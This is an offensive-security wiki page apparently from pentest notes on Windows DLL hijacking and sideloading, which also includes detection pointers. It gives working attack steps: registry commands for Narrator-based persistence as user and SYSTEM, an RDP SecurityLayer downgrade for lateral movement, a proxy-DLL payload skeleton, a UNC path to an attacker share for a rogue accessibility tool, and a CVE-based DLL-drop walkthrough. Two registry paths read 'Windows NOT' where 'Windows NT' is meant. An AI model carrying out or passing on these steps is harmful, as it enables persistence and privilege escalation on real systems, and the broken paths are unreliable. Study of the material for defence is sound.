---
title: DLL Hijacking & Sideloading
permalink: /wiki/offsec-notes/concepts/dll-hijacking/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
---

**Category:** Persistence / Privilege Escalation / Defense Evasion
**MITRE ATT&CK:** T1574.001 — DLL Search Order Hijacking; T1574.002 — DLL Side-Loading
**Related:** [Privilege Escalation Windows](/wiki/offsec-notes/concepts/privilege-escalation-windows/), [Evasion Techniques](/wiki/offsec-notes/concepts/evasion-techniques/), [Post Exploitation](/wiki/offsec-notes/concepts/post-exploitation/)

## Overview
DLL hijacking exploits Windows' DLL search order or a missing DLL dependency to load attacker-controlled code when a legitimate binary executes. Sideloading places a malicious DLL alongside a trusted executable that loads it without validation. Both techniques achieve code execution in the context of the target process, with optional privilege escalation when the loader runs elevated.

## DLL Search Order
When a binary loads a DLL by name (no full path), Windows searches in this order:
1. The application's own directory
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. The current working directory
6. Directories in PATH

An attacker who can write to any earlier position in the search order wins.

## Discovery — Finding Hijackable DLLs

### Process Monitor (Procmon) Technique
Filter: `Result = NAME NOT FOUND` + `Path ends with .dll`
Look for:
- Paths in user-writable directories
- Missing DLLs loaded from the application's own directory
- `NAME NOT FOUND` before a successful load from System32 (hijackable if earlier path is writable)

### Automated Tools
```bash
# PowerSploit
Find-PathDLLHijack
Find-ProcessDLLHijack

# Winpeas (highlights writable DLL paths)
winPEAS.exe quiet notcolor
```

## Attack Patterns

### Pattern 1: Missing DLL in Writable Directory (Sideloading)
Target executable searches for a DLL in its own directory; the DLL doesn't exist; the directory is writable.

```
# Example: CVE-2025-1729 — Lenovo TPQMAssistant
# Scheduled task runs C:\ProgramData\Lenovo\TPQM\Assistant\TPQMAssistant.exe daily at 9:30AM
# TPQMAssistant.exe attempts to load hostfxr.dll from its own directory — NAME NOT FOUND
# C:\ProgramData\Lenovo\TPQM\Assistant\ is writable by any local user (CREATOR OWNER)
# Attack: drop malicious hostfxr.dll in that directory
# Result: code runs in context of whoever triggers the scheduled task (escalates to local admin session)

# CVE-2025-1729 timeline: discovered 2025-01-30, fixed in TPQMAssistant v1.12.54.0 (UWP)
# Mitigation: UWP version stores data under C:\Program Files\ instead
```

### Pattern 2: Narrator.exe / Windows Accessibility (Admin Required)
Narrator.exe loads `msttsloc_onecoreenus.dll` from a path it doesn't exist in:
```
%windir%\system32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll
```
(Updated path from the older `%windir%\system32\speech\engine\tts\msttslocenus.dll`)

The directory is writable by administrators. The DLL doesn't need exports — code in `DllMain/DLL_PROCESS_ATTACH` executes.

**Persistence as User:**
```
# Set Narrator to auto-start at logon via HKCU
reg add "HKCU\Software\Microsoft\Windows NOT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "narrator" /f
# On next logon, Narrator starts → loads malicious DLL
```

**Persistence as SYSTEM:**
```
# Set Narrator under HKLM → starts at login screen → runs as SYSTEM
reg add "HKLM\Software\Microsoft\Windows NOT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "narrator" /f
```

**Lateral Movement via RDP:**
```
# 1. Transfer malicious DLL to target
# 2. Change RDP SecurityLayer to 0 (allows Narrator on login screen):
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
# 3. RDP to target, press CTRL+WIN+ENTER to trigger Narrator → DLL executes
```

**Suppressing Narrator Voice:**
The malicious DLL should identify the main Narrator thread and suspend it, then execute payload in the DLL's thread. Reference implementation: github.com/api0cradle/Narrator-dll

**Custom Accessibility Tool (Bring Your Own AT):**
```
# 1. Export CursorIndicator registry entry from HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\
# 2. Edit name/description/binary path to point to payload
# 3. Import back into registry
# 4. Add name to configuration value in HKCU or HKLM Accessibility key
# 5. Trigger with: ATBroker.exe /start <YourATName>
# Can also use UNC path: \\attacker\share\payload.exe
```

### Pattern 3: Notepad++ Plugin DLL
See [Notepadplusplus Abuse](/wiki/offsec-notes/concepts/notepadplusplus-abuse/) for plugin-as-DLL persistence.

## Proxy DLL / Forwarding Exports
When the legitimate binary checks that specific DLL exports exist, a minimal proxy DLL forwards all expected exports to the real DLL while executing malicious code:
```c
// Forward exports to the legitimate DLL
#pragma comment(linker, "/export:LegitFunc=C:\\Windows\\System32\\legit.dll.LegitFunc,@1")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Payload here
    }
    return TRUE;
}
```

## Detection Notes
- Procmon: filter for `NAME NOT FOUND` on .dll extensions in non-standard paths
- Sysmon Event ID 7: ImageLoaded — watch for DLLs loading from user-writable paths
- Accessibility registry keys (`HKCU/HKLM\...\Accessibility\configuration`) set to anything other than normal entries
- DLLs in `C:\ProgramData\` or user profile directories loaded by system processes
- ATBroker.exe launching unusual child processes

## Tools
- Procmon (Sysinternals) — DLL load tracing
- winPEAS — automated hijack path discovery
- PowerSploit: `Find-PathDLLHijack`, `Find-ProcessDLLHijack`
- github.com/api0cradle/Narrator-dll — Narrator DLL with thread suppression

## References
- TrustedSec — "Hack-cessibility: When DLL Hijacks Meet Windows Helpers" (2025-10-28)
- TrustedSec — "CVE-2025-1729: Privilege Escalation Using TPQMAssistant.exe" (2025-07-08)
- @Hexacorn — "Beyond good ol' Run Key" series (2013–2016)
- MITRE ATT&CK T1574.001, T1574.002
